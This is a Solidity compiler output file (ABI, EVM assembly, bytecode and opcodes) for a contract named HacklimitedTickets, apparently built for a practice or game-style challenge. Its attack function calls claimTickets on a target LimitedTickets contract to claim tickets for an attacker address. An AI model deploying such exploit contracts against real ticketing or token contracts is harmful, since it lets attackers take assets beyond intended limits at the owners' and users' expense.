{
	".deps/contracts/Games/LimitedTickets.sol": {
		"HacklimitedTickets": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_target",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "attacker",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "ticketAmount",
							"type": "uint256"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \".deps/contracts/Games/LimitedTickets.sol\":519:771  contract HacklimitedTickets {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \".deps/contracts/Games/LimitedTickets.sol\":519:771  contract HacklimitedTickets {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xa237de6c\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \".deps/contracts/Games/LimitedTickets.sol\":584:768  function attack(address _target ,address attacker, uint256 ticketAmount) public {... */\n    tag_3:\n      tag_4\n      tag_5\n      calldatasize\n      0x04\n      tag_6\n      jump\t// in\n    tag_5:\n      tag_7\n      jump\t// in\n    tag_4:\n      stop\n    tag_7:\n        /* \".deps/contracts/Games/LimitedTickets.sol\":675:681  target */\n      0x00\n        /* \".deps/contracts/Games/LimitedTickets.sol\":675:707  target = LimitedTickets(_target) */\n      dup1\n      sload\n      not(sub(shl(0xa0, 0x01), 0x01))\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      dup2\n      and\n      swap2\n      dup3\n      or\n      swap1\n      swap3\n      sstore\n        /* \".deps/contracts/Games/LimitedTickets.sol\":718:760  target.claimTickets(attacker,ticketAmount) */\n      mload(0x40)\n      shl(0xe0, 0x34002707)\n      dup2\n      mstore\n        /* \"#utility.yul\":717:749   */\n      swap2\n      dup5\n      and\n        /* \".deps/contracts/Games/LimitedTickets.sol\":718:760  target.claimTickets(attacker,ticketAmount) */\n      0x04\n      dup4\n      add\n        /* \"#utility.yul\":699:750   */\n      mstore\n        /* \"#utility.yul\":766:784   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":759:793   */\n      dup4\n      swap1\n      mstore\n        /* \".deps/contracts/Games/LimitedTickets.sol\":675:707  target = LimitedTickets(_target) */\n      swap1\n        /* \".deps/contracts/Games/LimitedTickets.sol\":718:737  target.claimTickets */\n      0x34002707\n      swap1\n        /* \"#utility.yul\":672:690   */\n      0x44\n      add\n        /* \".deps/contracts/Games/LimitedTickets.sol\":718:760  target.claimTickets(attacker,ticketAmount) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      revert(0x00, 0x00)\n    tag_11:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_13:\n      pop\n      pop\n      pop\n      pop\n        /* \".deps/contracts/Games/LimitedTickets.sol\":584:768  function attack(address _target ,address attacker, uint256 ticketAmount) public {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":14:187   */\n    tag_14:\n        /* \"#utility.yul\":82:102   */\n      dup1\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":131:162   */\n      dup2\n      and\n        /* \"#utility.yul\":121:163   */\n      dup2\n      eq\n        /* \"#utility.yul\":111:181   */\n      tag_17\n      jumpi\n        /* \"#utility.yul\":177:178   */\n      0x00\n        /* \"#utility.yul\":174:175   */\n      0x00\n        /* \"#utility.yul\":167:179   */\n      revert\n        /* \"#utility.yul\":111:181   */\n    tag_17:\n        /* \"#utility.yul\":14:187   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":192:520   */\n    tag_6:\n        /* \"#utility.yul\":269:275   */\n      0x00\n        /* \"#utility.yul\":277:283   */\n      0x00\n        /* \"#utility.yul\":285:291   */\n      0x00\n        /* \"#utility.yul\":338:340   */\n      0x60\n        /* \"#utility.yul\":326:335   */\n      dup5\n        /* \"#utility.yul\":317:324   */\n      dup7\n        /* \"#utility.yul\":313:336   */\n      sub\n        /* \"#utility.yul\":309:341   */\n      slt\n        /* \"#utility.yul\":306:358   */\n      iszero\n      tag_19\n      jumpi\n        /* \"#utility.yul\":354:355   */\n      0x00\n        /* \"#utility.yul\":351:352   */\n      0x00\n        /* \"#utility.yul\":344:356   */\n      revert\n        /* \"#utility.yul\":306:358   */\n    tag_19:\n        /* \"#utility.yul\":377:406   */\n      tag_20\n        /* \"#utility.yul\":396:405   */\n      dup5\n        /* \"#utility.yul\":377:406   */\n      tag_14\n      jump\t// in\n    tag_20:\n        /* \"#utility.yul\":367:406   */\n      swap3\n      pop\n        /* \"#utility.yul\":425:463   */\n      tag_21\n        /* \"#utility.yul\":459:461   */\n      0x20\n        /* \"#utility.yul\":448:457   */\n      dup6\n        /* \"#utility.yul\":444:462   */\n      add\n        /* \"#utility.yul\":425:463   */\n      tag_14\n      jump\t// in\n    tag_21:\n        /* \"#utility.yul\":415:463   */\n      swap2\n      pop\n        /* \"#utility.yul\":510:512   */\n      0x40\n        /* \"#utility.yul\":499:508   */\n      dup5\n        /* \"#utility.yul\":495:513   */\n      add\n        /* \"#utility.yul\":482:514   */\n      calldataload\n        /* \"#utility.yul\":472:514   */\n      swap1\n      pop\n        /* \"#utility.yul\":192:520   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n\n    auxdata: 0xa264697066735822122041b6796ba4953503d21de9c65e9f3d285a10279437ba2d6afaa00d6039a6b51064736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600e575f5ffd5b506101338061001c5f395ff3fe6080604052348015600e575f5ffd5b50600436106026575f3560e01c8063a237de6c14602a575b5f5ffd5b6039603536600460c9565b603b565b005b5f80546001600160a01b0319166001600160a01b03858116918217909255604051633400270760e01b8152918416600483015260248201839052906334002707906044015f604051808303815f87803b1580156095575f5ffd5b505af115801560a6573d5f5f3e3d5ffd5b50505050505050565b80356001600160a01b038116811460c4575f5ffd5b919050565b5f5f5f6060848603121560da575f5ffd5b60e18460af565b925060ed6020850160af565b915060408401359050925092509256fea264697066735822122041b6796ba4953503d21de9c65e9f3d285a10279437ba2d6afaa00d6039a6b51064736f6c634300081c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x133 DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x26 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA237DE6C EQ PUSH1 0x2A JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH1 0x39 PUSH1 0x35 CALLDATASIZE PUSH1 0x4 PUSH1 0xC9 JUMP JUMPDEST PUSH1 0x3B JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND SWAP2 DUP3 OR SWAP1 SWAP3 SSTORE PUSH1 0x40 MLOAD PUSH4 0x34002707 PUSH1 0xE0 SHL DUP2 MSTORE SWAP2 DUP5 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP4 SWAP1 MSTORE SWAP1 PUSH4 0x34002707 SWAP1 PUSH1 0x44 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0x95 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0xA6 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH1 0xC4 JUMPI PUSH0 PUSH0 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH0 PUSH0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH1 0xDA JUMPI PUSH0 PUSH0 REVERT JUMPDEST PUSH1 0xE1 DUP5 PUSH1 0xAF JUMP JUMPDEST SWAP3 POP PUSH1 0xED PUSH1 0x20 DUP6 ADD PUSH1 0xAF JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 COINBASE 0xB6 PUSH26 0x6BA4953503D21DE9C65E9F3D285A10279437BA2D6AFAA00D6039 0xA6 0xB5 LT PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "61400",
						"executionCost": "109",
						"totalCost": "61509"
					},
					"external": {
						"attack(address,address,uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack(address,address,uint256)": "a237de6c"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 49,
						"contract": ".deps/contracts/Games/LimitedTickets.sol:HacklimitedTickets",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(LimitedTickets)46"
					}
				],
				"types": {
					"t_contract(LimitedTickets)46": {
						"encoding": "inplace",
						"label": "contract LimitedTickets",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}